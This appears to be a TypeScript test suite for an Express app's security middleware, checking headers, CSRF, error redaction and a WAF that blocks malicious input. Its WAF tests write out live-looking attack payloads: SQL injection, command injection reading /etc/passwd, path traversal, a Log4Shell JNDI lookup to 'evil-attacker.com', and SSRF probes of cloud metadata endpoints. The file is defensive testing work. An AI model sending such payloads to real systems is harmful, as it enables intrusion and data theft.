import assert from 'node:assert/strict';
import { describe, test } from 'node:test';
import type { NextFunction, Request, Response } from 'express';
import {
  csrfGuardMiddleware,
  payloadInspectionWafMiddleware,
  prototypePollutionGuardMiddleware,
  safeErrorHandlerMiddleware,
  securityHeadersMiddleware,
} from '../server/security/index.ts';

type Middleware = (req: Request, res: Response, next: NextFunction) => unknown;

interface MockResponse {
  statusCode: number;
  headers: Record<string, string>;
  body: Record<string, unknown> | null;
  setHeader: (name: string, value: string) => void;
  getHeader: (name: string) => string | undefined;
  removeHeader: (name: string) => void;
  status: (code: number) => MockResponse;
  json: (data: Record<string, unknown>) => MockResponse;
}

interface MiddlewareResult {
  res: MockResponse;
  nextCalled: boolean;
}

function createMockResponse(): MockResponse {
  return {
    statusCode: 200,
    headers: {},
    body: null,
    setHeader(name, value) {
      this.headers[name.toLowerCase()] = value;
    },
    getHeader(name) {
      return this.headers[name.toLowerCase()];
    },
    removeHeader(name) {
      delete this.headers[name.toLowerCase()];
    },
    status(code) {
      this.statusCode = code;
      return this;
    },
    json(data) {
      this.body = data;
      return this;
    },
  };
}

function runMiddleware(middleware: Middleware, request: Record<string, unknown>): MiddlewareResult {
  const res = createMockResponse();
  let nextCalled = false;
  middleware(request as unknown as Request, res as unknown as Response, () => {
    nextCalled = true;
  });
  return { res, nextCalled };
}

function inspectGet(path: string, query: Record<string, string>, url = path): MiddlewareResult {
  return runMiddleware(payloadInspectionWafMiddleware, {
    url,
    originalUrl: url,
    query,
    body: {},
    ip: '127.0.0.1',
    method: 'GET',
    path,
  });
}

function assertBlocked({ res, nextCalled }: MiddlewareResult, status: number): void {
  assert.equal(nextCalled, false);
  assert.equal(res.statusCode, status);
}

describe('React stack integrity', () => {
  test('react-server-dom-webpack is not installed', async () => {
    const moduleName = 'react-server-dom-webpack';
    await assert.rejects(() => import(moduleName));
  });
});

describe('HTTP security headers', () => {
  const { res, nextCalled } = runMiddleware(securityHeadersMiddleware, { path: '/api/v1/incidents' });
  const csp = res.getHeader('content-security-policy') ?? '';

  test('passes the request through', () => assert.equal(nextCalled, true));
  test("CSP enforces default-src 'self'", () => assert.match(csp, /default-src 'self'/));
  test("CSP enforces object-src 'none'", () => assert.match(csp, /object-src 'none'/));
  test('CSP excludes external font origins', () => assert.doesNotMatch(csp, /fonts\.googleapis\.com/));
  test('sets X-Content-Type-Options nosniff', () => assert.equal(res.getHeader('x-content-type-options'), 'nosniff'));
  test('sets one-year HSTS', () => assert.match(res.getHeader('strict-transport-security') ?? '', /max-age=31536000/));
  test('sets strict referrer policy', () =>
    assert.equal(res.getHeader('referrer-policy'), 'strict-origin-when-cross-origin'));
  test('disables caching on API routes', () => assert.match(res.getHeader('cache-control') ?? '', /no-store/));
  test('suppresses X-Powered-By', () => assert.equal(res.getHeader('x-powered-by'), undefined));
});

describe('prototype pollution guard', () => {
  const result = runMiddleware(prototypePollutionGuardMiddleware, {
    body: JSON.parse('{"__proto__": {"admin": true}}'),
    query: {},
    params: {},
    ip: '127.0.0.1',
    method: 'POST',
    path: '/api/v1/settings',
  });

  test('rejects __proto__ payloads with 400', () => assertBlocked(result, 400));
  test('returns the authoritative error code', () =>
    assert.equal(result.res.body?.error, 'PROTOTYPE_POLLUTION_BLOCKED'));
});

describe('injection payload inspection', () => {
  test('blocks SQL injection', () => {
    const result = inspectGet(
      '/api/v1/incidents',
      { filter: "1' UNION SELECT null, username, password FROM users--" },
      '/api/v1/incidents?filter=1%27%20UNION%20SELECT%20null,%20username,%20password%20FROM%20users--',
    );
    assertBlocked(result, 403);
    assert.equal(result.res.body?.category, 'SQL Injection');
  });

  test('blocks OS command injection', () => {
    const result = inspectGet(
      '/api/v1/tools',
      { target: '127.0.0.1;cat /etc/passwd' },
      '/api/v1/tools?target=127.0.0.1;cat%20/etc/passwd',
    );
    assertBlocked(result, 403);
    assert.equal(result.res.body?.category, 'OS Command Injection');
  });

  test('blocks path traversal', () => {
    const result = inspectGet(
      '/api/v1/files',
      { path: '../../../../etc/passwd' },
      '/api/v1/files?path=../../../../etc/passwd',
    );
    assertBlocked(result, 403);
  });

  test('blocks Log4Shell JNDI lookups', () => {
    const result = runMiddleware(payloadInspectionWafMiddleware, {
      url: '/api/v1/log',
      originalUrl: '/api/v1/log',
      query: {},
      // biome-ignore lint/suspicious/noTemplateCurlyInString: literal Log4Shell payload
      body: { userAgent: '${jndi:ldap://evil-attacker.com/exploit}' },
      ip: '127.0.0.1',
      method: 'POST',
      path: '/api/v1/log',
    });
    assertBlocked(result, 403);
    assert.ok((result.res.body?.cveReferences as string[] | undefined)?.includes('CVE-2021-44228'));
  });
});

describe('SSRF and cloud metadata defense', () => {
  const probes = [
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://169.254.169.254/latest/meta-data/',
    'http://2130706433/',
  ];

  for (const target of probes) {
    test(`blocks ${target}`, () => {
      assertBlocked(inspectGet('/api/v1/webhook', { url: target }, `/api/v1/webhook?url=${target}`), 403);
    });
  }
});

describe('CSRF guard', () => {
  const mutation = (headers: Record<string, string>) =>
    runMiddleware(csrfGuardMiddleware, { method: 'POST', path: '/api/v1/incidents/contain', headers });

  test('blocks mutations without custom headers', () => assertBlocked(mutation({}), 403));

  test('blocks cross-site fetches', () =>
    assertBlocked(mutation({ 'x-tenant-id': 'tenant-enterprise-hq', 'sec-fetch-site': 'cross-site' }), 403));

  test('allows same-origin mutations with custom headers', () => {
    const result = mutation({
      'x-tenant-id': 'tenant-enterprise-hq',
      'x-correlation-id': 'corr-12345',
      'sec-fetch-site': 'same-origin',
    });
    assert.equal(result.nextCalled, true);
  });
});

describe('safe error handler', () => {
  const error = new Error('Database password failed: /var/lib/postgresql/data connection timeout at secret_pass_123');
  const res = createMockResponse();
  const originalConsoleError = console.error;
  console.error = () => {};
  safeErrorHandlerMiddleware(error, {} as Request, res as unknown as Response, () => {});
  console.error = originalConsoleError;
  const body = JSON.stringify(res.body);

  test('returns 500', () => assert.equal(res.statusCode, 500));
  test('suppresses secrets', () => assert.doesNotMatch(body, /secret_pass_123/));
  test('suppresses filesystem paths', () => assert.doesNotMatch(body, /\/var\/lib\/postgresql/));
  test('returns a correlation id', () => assert.ok(res.body?.correlationId));
});
